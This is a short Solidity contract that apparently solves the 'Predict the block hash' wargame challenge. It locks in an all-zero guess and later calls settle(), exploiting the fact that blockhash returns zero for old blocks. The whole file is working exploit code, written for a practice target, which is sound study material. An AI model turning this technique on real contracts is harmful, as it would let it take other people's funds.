pragma solidity ^0.7.3;

interface IPredictTheBlockHashChallenge {
    function lockInGuess(bytes32 hash) external payable;

    function settle() external;
}

contract PredictAttack {
    IPredictTheBlockHashChallenge victim;
    bytes32 public answer;

    constructor(address victimAddress) payable {
        require(msg.value == 1 ether);
        victim = IPredictTheBlockHashChallenge(victimAddress);
    }

    function lokcIn() public {
        answer = 0x0000000000000000000000000000000000000000000000000000000000000000;
        victim.lockInGuess{value: 1 ether}(answer);
    }

    function attack() public {
        victim.settle();
    }

    receive() external payable {}
}
